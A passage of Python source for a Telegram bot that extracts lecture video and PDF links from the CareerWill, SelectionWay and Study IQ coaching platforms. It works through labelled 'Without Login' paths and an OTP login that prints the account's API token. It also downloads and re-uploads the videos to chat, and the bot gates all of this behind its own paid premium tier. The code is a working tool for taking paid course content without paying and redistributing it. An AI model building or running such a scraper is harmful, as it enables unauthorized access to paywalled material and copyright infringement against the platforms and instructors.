    await safe_edit(prog, f"⚙️ *CareerWill Extract...*\n\n📌 `{bname}`\n📚 Topics: `{len(topics)}`\n\n📊 Shuru...")
    all_lines=[]; tv=tp=fv=fp=0; ft=[]; done=0; t0=time.time(); last=t0
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        fmap = {ex.submit(cw_process_topic,bid,t):t for t in topics}
        for f in concurrent.futures.as_completed(fmap):
            topic=fmap[f]; done+=1
            try:
                d,v,p,vf_,pf_ = f.result(timeout=120)
                all_lines.extend(d); tv+=v; tp+=p; fv+=vf_; fp+=pf_
                if not d: ft.append(topic.get("topicName","?"))
            except: ft.append(topic.get("topicName","?"))
            now=time.time()
            if done%3==0 or done==len(topics) or now-last>4:
                last=now; bar,pct=build_bar(done,len(topics))
                await safe_edit(prog, f"⚙️ *CareerWill — {bname}*\n\n{bar} `{pct}%`\n\n"
                    f"📁 `{done}/{len(topics)}`\n🎥 `{tv}` ✅ `{fv}` ❌\n📄 `{tp}` ✅ `{fp}` ❌\n📦 `{len(all_lines)}`\n⏱️ `{now-t0:.1f}s`")
    await send_result(message, prog, all_lines, bname, bid, tv, tp, fv, fp, ft, t0, "CareerWill")

# ══════════════════════════════════════════════════════
#  SELECTIONWAY EXTRACT (Without Login)
# ══════════════════════════════════════════════════════
def sw_kb(batches, page):
    tp=max(1,(len(batches)+BATCHES_PER_PAGE-1)//BATCHES_PER_PAGE)
    s=page*BATCHES_PER_PAGE; e=s+BATCHES_PER_PAGE; kb=[]
    for b in batches[s:e]:
        bid=b.get("id",""); title=b.get("title","Unknown")
        lbl=title[:46]+"…" if len(title)>46 else title
        kb.append([InlineKeyboardButton(f"🏆 {lbl}", callback_data=f"sw_bt_{bid}")])
    nav=[]
    if page>0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"sw_pg_{page-1}"))
    nav.append(InlineKeyboardButton(f"📄 {page+1}/{tp}", callback_data="noop"))
    if e<len(batches): nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"sw_pg_{page+1}"))
    kb.append(nav); kb.append([InlineKeyboardButton("🔙 Back", callback_data="nlx_back")])
    return InlineKeyboardMarkup(kb)

async def sw_show_page(q, context, page, fresh):
    if "sw_batches" not in context.user_data:
        prog = await q.message.reply_text("⏳ *SelectionWay batches...*", parse_mode=ParseMode.MARKDOWN)
        data = fetch_json(SW_ALL_BATCH)
        if not data or not data.get("success"): await safe_edit(prog,"❌ *Failed!*"); return
        context.user_data["sw_batches"] = data.get("data",[]); await prog.delete()
    batches=context.user_data["sw_batches"]; total=len(batches)
    tp=max(1,(total+BATCHES_PER_PAGE-1)//BATCHES_PER_PAGE)
    txt=f"🏆 *SelectionWay — All Batches*\n\n📦 `{total}` | 📄 `{page+1}/{tp}`\n\n_Batch choose karo 👇_"
    mk=sw_kb(batches,page)
    if fresh: await q.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN, reply_markup=mk)
    else: await safe_edit(q.message, txt, markup=mk)

async def sw_browse_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer(); uid=q.from_user.id
    if not is_premium(uid): await send_not_premium(q.message); return MAIN_MENU
    if q.data.startswith("sw_pg_"):
        await sw_show_page(q, context, int(q.data[6:]), False); return SW_BROWSE
    elif q.data.startswith("sw_bt_"):
        bid=q.data[6:]
        bname=next((b.get("title","?") for b in context.user_data.get("sw_batches",[]) if b.get("id")==bid),"Unknown")
        await sw_do_extract(q.message, bid, bname); return ConversationHandler.END
    elif q.data in ("nlx_back","back_home"):
        await show_home_cb(q.message); return MAIN_MENU
    elif q.data=="noop": return SW_BROWSE
    return SW_BROWSE

async def sw_do_extract(message, bid, bname):
    prog = await message.reply_text(f"✅ *Batch Select!*\n\n📌 *{bname}*\n\n⚙️ Fetching...", parse_mode=ParseMode.MARKDOWN)
    t0=time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as ex:
        fc=ex.submit(fetch_json, SW_CHAPTER.format(bid)); fp=ex.submit(fetch_json, SW_PDF.format(bid))
        ch=fc.result(timeout=60); pd=fp.result(timeout=60)
    all_lines=[]; tv=tp=fv=fp_c=0
    if ch and ch.get("success"):
        for t in ch.get("classes",[]):
            tn=t.get("topicName","?")
            for cls in t.get("classes",[]):
                title=cls.get("title","?"); url=cls.get("class_link","")
                if url: all_lines.append(f"[{tn}] Video | {title} : {url}"); tv+=1
                else: all_lines.append(f"[{tn}] Video | {title} : ❌ FAILED"); fv+=1
    if pd and pd.get("success"):
        for t in pd.get("topics",[]):
            tn=t.get("topicName","?")
            for pdf in t.get("pdfs",[]):
                title=pdf.get("title","?"); purl=pdf.get("uploadPdf","")
                if purl: all_lines.append(f"[{tn}] PDF | {title} : {purl}"); tp+=1
                else: all_lines.append(f"[{tn}] PDF | {title} : ❌ FAILED"); fp_c+=1
    if not all_lines: await safe_edit(prog,"❌ *Kuch nahi mila!*"); return
    await send_result(message, prog, all_lines, bname, bid, tv, tp, fv, fp_c, [], t0, "SelectionWay")

# ══════════════════════════════════════════════════════
#  STUDY IQ (Without Login)
# ══════════════════════════════════════════════════════
async def iq_show_sub_menu(message):
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔐 My Batches (Login)",  callback_data="iq_login")],
        [InlineKeyboardButton("🆓 Without Login",       callback_data="iq_free")],
        [InlineKeyboardButton("🔙 Back",               callback_data="nlx_back")],
    ])
    await safe_edit(message, "📘 *Study IQ Extract*\n\nOption choose karo 👇", markup=kb)

async def iq_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    if not is_premium(q.from_user.id): await send_not_premium(q.message); return MAIN_MENU
    if q.data=="iq_login":
        await safe_edit(q.message,
            "📘 *Study IQ Login*\n\nPhone number ya Token bhejo:\n\nExample: `9876543210`\n\n_/cancel to go back_")
        return IQ_AUTH
    elif q.data=="iq_free":
        await iq_free_show(q,context,0,True); return IQ_FREE_BROWSE
    elif q.data in ("nlx_back","back_home","iq_submenu"):
        await show_home_cb(q.message); return MAIN_MENU
    return IQ_MENU

def iq_free_kb(batches, page):
    tp=max(1,(len(batches)+BATCHES_PER_PAGE-1)//BATCHES_PER_PAGE)
    s=page*BATCHES_PER_PAGE; e=s+BATCHES_PER_PAGE; kb=[]
    for b in batches[s:e]:
        bid=b.get("id",""); title=b.get("title","Unknown")
        lbl=title[:38]+"…" if len(title)>38 else title
        kb.append([InlineKeyboardButton(f"📘 {lbl}", callback_data=f"iqf_ex_{bid}"),
                   InlineKeyboardButton("👁 Info",   callback_data=f"iqf_pv_{bid}")])
    nav=[]
    if page>0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"iqf_pg_{page-1}"))
    nav.append(InlineKeyboardButton(f"📄 {page+1}/{tp}", callback_data="noop"))
    if e<len(batches): nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"iqf_pg_{page+1}"))
    kb.append(nav); kb.append([InlineKeyboardButton("🔍 Search", callback_data="iqf_search"),
                                InlineKeyboardButton("🔙 Back",  callback_data="iq_submenu")])
    return InlineKeyboardMarkup(kb)

async def iq_free_show(q, context, page, fresh):
    if "iqf_batches" not in context.user_data:
        prog = await q.message.reply_text("⏳ *Study IQ batches...*", parse_mode=ParseMode.MARKDOWN)
        raw = fetch_json(IQ_VALID_COURSES_URL)
        if not raw or not isinstance(raw,list): await safe_edit(prog,"❌ *Failed!*"); return
        context.user_data["iqf_batches"] = raw; await prog.delete()
    batches=context.user_data["iqf_batches"]; total=len(batches)
    tp=max(1,(total+BATCHES_PER_PAGE-1)//BATCHES_PER_PAGE)
    txt=f"📘 *Study IQ — Without Login*\n\n📦 `{total}` | 📄 `{page+1}/{tp}`\n\n_Batch tap karo 👇_"
    mk=iq_free_kb(batches,page)
    if fresh: await q.message.reply_text(txt,parse_mode=ParseMode.MARKDOWN,reply_markup=mk)
    else: await safe_edit(q.message,txt,markup=mk)

async def iq_free_browse_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    if not is_premium(q.from_user.id): await send_not_premium(q.message); return MAIN_MENU
    if q.data.startswith("iqf_pg_"):
        await iq_free_show(q,context,int(q.data[7:]),False); return IQ_FREE_BROWSE
    elif q.data=="iqf_search":
        await q.message.reply_text("🔍 *Search:*\n\nKeyword type karo:", parse_mode=ParseMode.MARKDOWN); return IQ_FREE_SEARCH
    elif q.data.startswith("iqf_pv_"):
        bid=q.data[7:]
        b=next((x for x in context.user_data.get("iqf_batches",[]) if str(x.get("id"))==bid),None)
        if not b: await q.answer("❌",show_alert=True); return IQ_FREE_BROWSE
        kb=InlineKeyboardMarkup([[InlineKeyboardButton("⚡ Extract",callback_data=f"iqf_ex_{bid}")],
                                  [InlineKeyboardButton("🔙 Back",  callback_data="iqf_pg_0")]])
        await q.message.reply_text(f"👁 *{b.get('title','?')}*\n🆔 `{bid}`\n💰 `{b.get('price','N/A')}`",
            parse_mode=ParseMode.MARKDOWN, reply_markup=kb); return IQ_FREE_BROWSE
    elif q.data.startswith("iqf_ex_"):
        bid=q.data[7:]
        b=next((x for x in context.user_data.get("iqf_batches",[]) if str(x.get("id"))==bid),None)
        bname=b.get("title","Unknown") if b else "Unknown"
        await iq_do_extract(q.message,context,bid,bname); return ConversationHandler.END
    elif q.data in ("iq_submenu","back_home","nlx_back"):
        await show_home_cb(q.message); return MAIN_MENU
    elif q.data=="noop": return IQ_FREE_BROWSE
    return IQ_FREE_BROWSE

async def iq_free_search_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_premium(update.effective_user.id): await send_not_premium(update.message); return ConversationHandler.END
    kw=update.message.text.strip().lower()
    res=[b for b in context.user_data.get("iqf_batches",[]) if kw in b.get("title","").lower()]
    if not res: await update.message.reply_text(f"❌ *`{kw}` nahi mila.*",parse_mode=ParseMode.MARKDOWN); return IQ_FREE_SEARCH
    kb=[]
    for b in res[:15]:
        b_id = str(b.get('id',''))
        b_title = b.get('title','')[:38]
        kb.append([InlineKeyboardButton(f'📘 {b_title}', callback_data=f'iqf_ex_{b_id}'),
                   InlineKeyboardButton('👁', callback_data=f'iqf_pv_{b_id}')])
    kb.append([InlineKeyboardButton("🔙 Back",callback_data="iqf_pg_0")])
    await update.message.reply_text(f"🔍 `{kw}` — `{len(res)}` mila\n\n_Tap to extract 👇_",
        parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))
    return IQ_FREE_BROWSE

async def iq_auth_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text=update.message.text.strip()
    prog=await update.message.reply_text("⏳ *Processing...*", parse_mode=ParseMode.MARKDOWN)
    if not text.isdigit():
        context.user_data["iq_token"]=text
        await safe_edit(prog,"✅ *Token accepted!*\n\n⏳ Batches fetch ho rahe hain...")
        return await iq_fetch_batches(update,context,prog)
    resp=post_json(IQ_LOGIN_URL,{"mobile":text})
    if not resp: await safe_edit(prog,"❌ *Login fail!*"); return IQ_AUTH
    uid_r=resp.get("data",{}).get("user_id") if resp.get("data") else None
    if not uid_r: await safe_edit(prog,f"❌ `{resp.get('msg','Error')}`"); return IQ_AUTH
    context.user_data["iq_user_id"]=uid_r
    await safe_edit(prog,f"📱 *OTP bheja!*\n\n`{resp.get('msg','')}`\n\n_OTP bhejo 👇_")
    return IQ_OTP_STATE

async def iq_otp_handler_state(update: Update, context: ContextTypes.DEFAULT_TYPE):
    otp=update.message.text.strip()
    prog=await update.message.reply_text("⏳ *OTP verify...*", parse_mode=ParseMode.MARKDOWN)
    resp=post_json(IQ_OTP_URL,{"user_id":context.user_data.get("iq_user_id"),"otp":otp})
    if not resp: await safe_edit(prog,"❌ *OTP fail!*"); return IQ_OTP_STATE
    token=resp.get("data",{}).get("api_token") if resp.get("data") else None
    if not token: await safe_edit(prog,f"❌ `{resp.get('msg','Error')}`"); return IQ_OTP_STATE
    context.user_data["iq_token"]=token
    await update.message.reply_text(f"✅ *Login OK!*\n\n💾 Token:\n`{token}`\n\n⏳...",parse_mode=ParseMode.MARKDOWN)
    await prog.delete()
    p2=await update.message.reply_text("⏳ *Loading...*",parse_mode=ParseMode.MARKDOWN)
    return await iq_fetch_batches(update,context,p2)

async def iq_fetch_batches(update, context, prog):
    token=context.user_data.get("iq_token")
    resp=fetch_json(IQ_COURSES_URL, headers={"Authorization":f"Bearer {token}"})
    if not resp or not resp.get("data"): await safe_edit(prog,"❌ *Koi batch nahi!*"); return ConversationHandler.END
    courses=resp["data"]; context.user_data["iq_courses"]={str(c["courseId"]):c["courseTitle"] for c in courses}
    kb=[[InlineKeyboardButton(f"📘 {c.get('courseTitle','?')[:44]}", callback_data=f"iq_bt_{c.get('courseId','')}")]
        for c in courses]
    kb.append([InlineKeyboardButton("🔙 Back",callback_data="back_main")])
    await safe_edit(prog,f"📘 *Study IQ — Your Batches*\n\n📦 `{len(courses)}`\n\n_Tap to extract 👇_",
        markup=InlineKeyboardMarkup(kb))
    return IQ_BATCH_LIST

async def iq_batch_list_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    if q.data.startswith("iq_bt_"):
        bid=q.data[6:]; bname=context.user_data.get("iq_courses",{}).get(bid,"Unknown")
        await iq_do_extract(q.message,context,bid,bname); return ConversationHandler.END
    elif q.data in ("back_main","back_home"):
        await show_home_cb(q.message); return MAIN_MENU
    return IQ_BATCH_LIST

async def iq_do_extract(message, context, bid, bname):
    token=context.user_data.get("iq_token",""); hdrs={"Authorization":f"Bearer {token}"} if token else {}
    prog=await message.reply_text(f"✅ *Batch Select!*\n\n📌 *{bname}*\n\n⏳ Fetching...",parse_mode=ParseMode.MARKDOWN)
    t0=time.time()
    master=fetch_json(IQ_DETAILS_URL.format(bid,""),headers=hdrs)
    if not master or not master.get("data"): await safe_edit(prog,"❌ *Batch details fail!*"); return
    bname=master.get("courseTitle",bname); topics=master["data"]
    all_lines=[]; tv=tp=fv=fp=0; total_t=len(topics)
    await safe_edit(prog,f"⚙️ *Study IQ — {bname}*\n\n📚 `{total_t}` topics\n\n📊 Extracting...")
    done=0; last=t0
    for topic in topics:
        tid=topic.get("contentId"); tname=topic.get("name","Unknown")
        pd=fetch_json(IQ_DETAILS_P.format(bid,tid),headers=hdrs)
        if not pd or not pd.get("data"): done+=1; continue
        subs=pd["data"]; has_sub=any(x.get("subFolderOrderId") is not None for x in subs)
        def proc(items,label):
            ln=[]; v=p=0
            for item in items:
                url=item.get("videoUrl"); name=item.get("name","?"); cid_=item.get("contentId")
                if url: ln.append(f"[{label}] Video | {name} : {url}"); v+=1
                if cid_:
                    try:
                        nr=fetch_json(IQ_LESSON_URL.format(cid_,bid),headers=hdrs)
                        if nr and nr.get("options"):
                            for opt in nr["options"]:
                                for ud in (opt.get("urls") or []):
                                    if ud.get("name") and ud.get("url"):
                                        ln.append(f"[{label}] PDF | {ud['name']} : {ud['url']}"); p+=1
                    except: pass
            return ln,v,p,0,0
        if not has_sub:
            ln,v,p,_,__=proc(subs,tname); all_lines.extend(ln); tv+=v; tp+=p
        else:
            for sub in subs:
                pid=sub.get("contentId"); sname=sub.get("name",tname)
                vd=fetch_json(IQ_DETAILS_P.format(bid,f"{tid}/{pid}"),headers=hdrs)
                if vd and vd.get("data"):
                    ln,v,p,_,__=proc(vd["data"],f"{tname} > {sname}"); all_lines.extend(ln); tv+=v; tp+=p
        done+=1; now=time.time()
        if done%2==0 or done==total_t or now-last>4:
            last=now; bar,pct=build_bar(done,total_t)
            await safe_edit(prog, f"⚙️ *Study IQ — {bname}*\n\n{bar} `{pct}%`\n\n"
                f"📁 `{done}/{total_t}`\n🎥 `{tv}` ✅\n📄 `{tp}` ✅\n📦 `{len(all_lines)}`\n⏱️ `{now-t0:.1f}s`")
    if not all_lines: await safe_edit(prog,"❌ *Kuch nahi mila!*"); return
    await send_result(message,prog,all_lines,bname,bid,tv,tp,fv,fp,[],t0,"StudyIQ")

# ══════════════════════════════════════════════════════
#  STUDY MODE (Premium)
# ══════════════════════════════════════════════════════
async def study_menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer(); uid=q.from_user.id
    if not is_premium(uid): await send_not_premium(q.message); return MAIN_MENU
    if q.data=="study_cw":
        await s_cw_show_batches(q,context,0,True); return STUDY_CW_BATCHES
    elif q.data=="study_sw":
        await s_sw_show_batches(q,context,0,True); return STUDY_SW_BATCHES
    elif q.data=="study_kgs":
        return await study_kgs_courses_handler(update, context)
    elif q.data in ("back_home","back_study"):
        await show_home_cb(q.message); return MAIN_MENU
    elif q.data.startswith("study_cw_pg_"):
        await s_cw_show_batches(q,context,int(q.data.split("_")[-1]),False); return STUDY_CW_BATCHES
    elif q.data.startswith("study_cw_bt_"):
        bid=q.data.replace("study_cw_bt_","")
        batches=context.user_data.get("cw_batches",[])
        bname=next((n for i,n in batches if i==bid),"Unknown")
        context.user_data.update({"scw_bid":bid,"scw_bname":bname})
        await s_cw_show_topics(q.message,bid,bname); return STUDY_CW_TOPICS
    elif q.data.startswith("study_sw_pg_"):
        await s_sw_show_batches(q,context,int(q.data.split("_")[-1]),False); return STUDY_SW_BATCHES
    elif q.data.startswith("study_sw_bt_"):
        bid=q.data.replace("study_sw_bt_","")
        batches=context.user_data.get("sw_batches",[])
        bname=next((b.get("title","?") for b in batches if b.get("id")==bid),"Unknown")
        context.user_data.update({"ssw_bid":bid,"ssw_bname":bname})
        await s_sw_show_topics(q.message,bid,bname,context); return STUDY_SW_TOPICS
    return STUDY_MENU

async def s_cw_show_batches(q, context, page, fresh):
    if "cw_batches" not in context.user_data:
        prog=await q.message.reply_text("⏳ *Batches...*",parse_mode=ParseMode.MARKDOWN)
        raw=fetch_json(CW_ALL_BATCHES)
        if not raw: await safe_edit(prog,"❌"); return
        context.user_data["cw_batches"]=sorted(raw.items(),key=lambda x:int(x[0]),reverse=True)
        await prog.delete()
    batches=context.user_data["cw_batches"]; total=len(batches)
    tp=max(1,(total+BATCHES_PER_PAGE-1)//BATCHES_PER_PAGE)
    s=page*BATCHES_PER_PAGE; e=s+BATCHES_PER_PAGE; kb=[]
    for bid,bname in batches[s:e]:
        lbl=bname[:46]+"…" if len(bname)>46 else bname
        kb.append([InlineKeyboardButton(f"📚 {lbl}",callback_data=f"study_cw_bt_{bid}")])
    nav=[]
    if page>0: nav.append(InlineKeyboardButton("⬅️",callback_data=f"study_cw_pg_{page-1}"))
    nav.append(InlineKeyboardButton(f"📄 {page+1}/{tp}",callback_data="noop"))
    if e<total: nav.append(InlineKeyboardButton("➡️",callback_data=f"study_cw_pg_{page+1}"))
    kb.append(nav); kb.append([InlineKeyboardButton("🔙 Back",callback_data="back_home")])
    txt=f"📖 *Study — CareerWill*\n\n📦 `{total}` | 📄 `{page+1}/{tp}`\n\n_Batch choose karo 👇_"
    mk=InlineKeyboardMarkup(kb)
    if fresh: await q.message.reply_text(txt,parse_mode=ParseMode.MARKDOWN,reply_markup=mk)
    else: await safe_edit(q.message,txt,markup=mk)

async def s_cw_show_topics(message, bid, bname):
    prog=await message.reply_text("⏳ *Topics...*",parse_mode=ParseMode.MARKDOWN)
    batch=fetch_json(CW_BATCH_API.format(bid))
    if not batch: await safe_edit(prog,"❌ *Failed!*"); return
    topics=batch.get("topics",[])
    if not topics: await safe_edit(prog,f"⚠️ *Koi topic nahi: `{bname}`*"); return
    kb=[]
    for t in topics[:30]:
        tid=t.get("id",""); tn=t.get("topicName","Unknown")
        lbl=tn[:46]+"…" if len(tn)>46 else tn
        kb.append([InlineKeyboardButton(f"📂 {lbl}",callback_data=f"scw_t_{bid}_{tid}")])
    kb.append([InlineKeyboardButton("🔙 Back to Batches",callback_data="study_cw_pg_0")])
    await safe_edit(prog,f"📖 *{bname}*\n\n📂 `{len(topics)}` topics\n\n_Topic choose karo 👇_",
        markup=InlineKeyboardMarkup(kb))

async def study_cw_topics_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    if not is_premium(q.from_user.id): await send_not_premium(q.message); return MAIN_MENU
    if q.data.startswith("scw_t_"):
        rest=q.data[6:]; parts=rest.split("_",1)
        if len(parts)!=2: return STUDY_CW_TOPICS
        bid,tid=parts; bname=context.user_data.get("scw_bname","Batch")
        prog=await q.message.reply_text("⏳ *Lectures...*",parse_mode=ParseMode.MARKDOWN)
        data=fetch_json(CW_TOPIC_API.format(bid,tid))
        if not data: await safe_edit(prog,"❌ *Failed!*"); return STUDY_CW_TOPICS
        classes=data.get("classes",[])
        if not classes: await safe_edit(prog,"⚠️ *Koi lecture nahi!*"); return STUDY_CW_TOPICS
        tname=data.get("topicName","Topic")
        context.user_data.setdefault("scw_vids",{}); kb=[]
        for cls in classes[:25]:
            cno=cls.get("class_no","?"); title=cls.get("title","?"); vid=cls.get("video_url","")
            key=f"scwv_{bid}_{tid}_{cno}"
            context.user_data["scw_vids"][key]={"title":f"Class {cno} — {title}","vid_id":vid,"topic":tname,"batch":bname}
            kb.append([InlineKeyboardButton(f"🎬 Class {cno} | {title}"[:50],callback_data=key)])
        kb.append([InlineKeyboardButton("🔙 Back",callback_data=f"scwbk_{bid}")])
        await safe_edit(prog,f"📂 *{tname}*\n\n🎬 `{len(classes)}` lectures\n\n_Choose karo 👇_",
            markup=InlineKeyboardMarkup(kb))
        return STUDY_CW_VIDEOS
    elif q.data.startswith("scwbk_"):
        bid=q.data[6:]; bname=context.user_data.get("scw_bname","Batch")
        await s_cw_show_topics(q.message,bid,bname); return STUDY_CW_TOPICS
    elif q.data.startswith("study_cw_pg_"):
        await s_cw_show_batches(q,context,int(q.data.split("_")[-1]),True); return STUDY_CW_BATCHES
    elif q.data in ("back_home","noop"): return STUDY_CW_TOPICS
    return STUDY_CW_TOPICS

async def study_cw_videos_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    if not is_premium(q.from_user.id): await send_not_premium(q.message); return MAIN_MENU
    if q.data.startswith("scwv_"):
        info=context.user_data.get("scw_vids",{}).get(q.data)
        if not info: await q.answer("❌ Session expire! /start karo.",show_alert=True); return STUDY_CW_VIDEOS
        context.user_data["cur_vid"]=info
        kb=InlineKeyboardMarkup([
            [InlineKeyboardButton("📥 Download & Upload",callback_data="vid_dl")],
            [InlineKeyboardButton("🔗 Sirf Link",       callback_data="vid_link")],
            [InlineKeyboardButton("🔙 Back",            callback_data="vid_back")],
        ])
        await q.message.reply_text(f"🎬 *{info['title']}*\n\n📂 {info['topic']}\n📚 {info['batch']}\n\n_Kya karna hai? 👇_",
            parse_mode=ParseMode.MARKDOWN, reply_markup=kb); return STUDY_VIDEO_ACT
    elif q.data.startswith("scwbk_"):
        bid=q.data[6:]; bname=context.user_data.get("scw_bname","Batch")
        await s_cw_show_topics(q.message,bid,bname); return STUDY_CW_TOPICS
    elif q.data in ("back_home","noop"): return STUDY_CW_VIDEOS
    return STUDY_CW_VIDEOS

async def study_video_act_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    if not is_premium(q.from_user.id): await send_not_premium(q.message); return MAIN_MENU
    info=context.user_data.get("cur_vid")
    if not info: await q.answer("❌ Session expire!",show_alert=True); return MAIN_MENU
    if q.data=="vid_link":
        prog=await q.message.reply_text("⏳ *Link fetch ho raha hai...*",parse_mode=ParseMode.MARKDOWN)
        url=get_cw_video_url(info.get("vid_id","")) if info.get("vid_id") else None
        if url: await safe_edit(prog,f"🔗 *Video Link:*\n\n`{url}`\n\n_Copy karke download karo 👆_")
        else: await safe_edit(prog,"❌ *Link nahi mila!*")
        return STUDY_VIDEO_ACT
    elif q.data=="vid_dl":
        prog=await q.message.reply_text("⏳ *Link fetch...*",parse_mode=ParseMode.MARKDOWN)
        url=get_cw_video_url(info.get("vid_id","")) if info.get("vid_id") else None
        if not url: await safe_edit(prog,"❌ *URL nahi mila!*"); return STUDY_VIDEO_ACT
        await prog.delete()
        await download_and_upload_video(q.message, url, info["title"], info["topic"], info["batch"])
        return STUDY_VIDEO_ACT
    elif q.data=="vid_back":
        await show_home_cb(q.message); return MAIN_MENU
    return STUDY_VIDEO_ACT

async def s_sw_show_batches(q, context, page, fresh):
    if "sw_batches" not in context.user_data:
        prog=await q.message.reply_text("⏳ *SW Batches...*",parse_mode=ParseMode.MARKDOWN)
        data=fetch_json(SW_ALL_BATCH)
        if not data or not data.get("success"): await safe_edit(prog,"❌"); return
        context.user_data["sw_batches"]=data.get("data",[]); await prog.delete()
    batches=context.user_data["sw_batches"]; total=len(batches)
    tp=max(1,(total+BATCHES_PER_PAGE-1)//BATCHES_PER_PAGE)
    s=page*BATCHES_PER_PAGE; e=s+BATCHES_PER_PAGE; kb=[]
    for b in batches[s:e]:
        bid=b.get("id",""); title=b.get("title","?")
        lbl=title[:46]+"…" if len(title)>46 else title
        kb.append([InlineKeyboardButton(f"🏆 {lbl}",callback_data=f"study_sw_bt_{bid}")])
    nav=[]
    if page>0: nav.append(InlineKeyboardButton("⬅️",callback_data=f"study_sw_pg_{page-1}"))
    nav.append(InlineKeyboardButton(f"📄 {page+1}/{tp}",callback_data="noop"))
    if e<total: nav.append(InlineKeyboardButton("➡️",callback_data=f"study_sw_pg_{page+1}"))
    kb.append(nav); kb.append([InlineKeyboardButton("🔙 Back",callback_data="back_home")])
    txt=f"📖 *Study — SelectionWay*\n\n📦 `{total}` | 📄 `{page+1}/{tp}`\n\n_Batch choose karo 👇_"
    mk=InlineKeyboardMarkup(kb)
    if fresh: await q.message.reply_text(txt,parse_mode=ParseMode.MARKDOWN,reply_markup=mk)
    else: await safe_edit(q.message,txt,markup=mk)

async def s_sw_show_topics(message, bid, bname, context):
    prog=await message.reply_text("⏳ *Topics...*",parse_mode=ParseMode.MARKDOWN)
    ch=fetch_json(SW_CHAPTER.format(bid))
    if not ch or not ch.get("success"): await safe_edit(prog,"❌"); return
    topics=ch.get("classes",[])
    if not topics: await safe_edit(prog,"⚠️ *Koi topic nahi!*"); return
    kb=[]; context.user_data.setdefault("ssw_topics",{})
    for t in topics[:30]:
        tn=t.get("topicName","?"); cls_c=len(t.get("classes",[]))
        key=f"sswt_{bid}_{tn[:25]}"
        context.user_data["ssw_topics"][key]=t
        lbl=f"{tn} ({cls_c} lec)"[:50]
        kb.append([InlineKeyboardButton(f"📂 {lbl}",callback_data=key)])
    kb.append([InlineKeyboardButton("🔙 Back",callback_data="study_sw_pg_0")])
    await safe_edit(prog,f"📖 *{bname}*\n\n📂 `{len(topics)}` topics\n\n_Topic choose karo 👇_",
        markup=InlineKeyboardMarkup(kb))

async def study_sw_topics_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    if not is_premium(q.from_user.id): await send_not_premium(q.message); return MAIN_MENU
    if q.data.startswith("sswt_"):
        tdata=context.user_data.get("ssw_topics",{}).get(q.data)
        if not tdata: await q.answer("❌",show_alert=True); return STUDY_SW_TOPICS
        tn=tdata.get("topicName","?"); classes=tdata.get("classes",[])
        bname=context.user_data.get("ssw_bname","Batch"); kb=[]
        context.user_data.setdefault("ssw_vids",{})
        for cls in classes[:25]:
            title=cls.get("title","?"); url=cls.get("class_link","")
            key=f"sswv_{abs(hash(title))%999999}"
            context.user_data["ssw_vids"][key]={"title":title,"url":url,"topic":tn,"batch":bname}
            kb.append([InlineKeyboardButton(f"🎬 {title[:50]}",callback_data=key)])
        kb.append([InlineKeyboardButton("🔙 Back",callback_data=f"sswbk_{context.user_data.get('ssw_bid','')}")])
        await q.message.reply_text(f"📂 *{tn}*\n\n🎬 `{len(classes)}` lectures\n\n_Choose karo 👇_",
            parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))
        return STUDY_SW_VIDEOS
    elif q.data.startswith("sswbk_"):
        bid=q.data[6:]; bname=context.user_data.get("ssw_bname","Batch")
        await s_sw_show_topics(q.message,bid,bname,context); return STUDY_SW_TOPICS
    elif q.data.startswith("study_sw_pg_"):
        await s_sw_show_batches(q,context,int(q.data.split("_")[-1]),True); return STUDY_SW_BATCHES
    elif q.data in ("back_home","noop"): return STUDY_SW_TOPICS
    return STUDY_SW_TOPICS

async def study_sw_videos_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q=update.callback_query; await q.answer()
    if not is_premium(q.from_user.id): await send_not_premium(q.message); return MAIN_MENU
    if q.data.startswith("sswv_"):
        info=context.user_data.get("ssw_vids",{}).get(q.data)
        if not info: await q.answer("❌",show_alert=True); return STUDY_SW_VIDEOS
        context.user_data["cur_sw_vid"]=info
        kb=InlineKeyboardMarkup([
            [InlineKeyboardButton("📥 Download & Upload",callback_data="swvid_dl")],
            [InlineKeyboardButton("🔗 Sirf Link",       callback_data="swvid_lk")],
            [InlineKeyboardButton("🔙 Back",            callback_data="swvid_bk")],
        ])
        await q.message.reply_text(f"🎬 *{info['title']}*\n\n📂 {info['topic']}\n📚 {info['batch']}\n\n_Kya karna hai? 👇_",
            parse_mode=ParseMode.MARKDOWN, reply_markup=kb); return STUDY_SW_VIDEOS
    elif q.data=="swvid_lk":
        info=context.user_data.get("cur_sw_vid",{})
        url=info.get("url","")
        if url: await q.message.reply_text(f"🔗 *Video Link:*\n\n`{url}`\n\n_Copy karke download karo 👆_",parse_mode=ParseMode.MARKDOWN)
        else: await q.message.reply_text("❌ *Link nahi!*",parse_mode=ParseMode.MARKDOWN)
        return STUDY_SW_VIDEOS
    elif q.data=="swvid_dl":
        info=context.user_data.get("cur_sw_vid",{}); url=info.get("url","")
        if not url: await q.message.reply_text("❌ *Link nahi!*",parse_mode=ParseMode.MARKDOWN); return STUDY_SW_VIDEOS
        await download_and_upload_video(q.message,url,info["title"],info["topic"],info["batch"])
        return STUDY_SW_VIDEOS
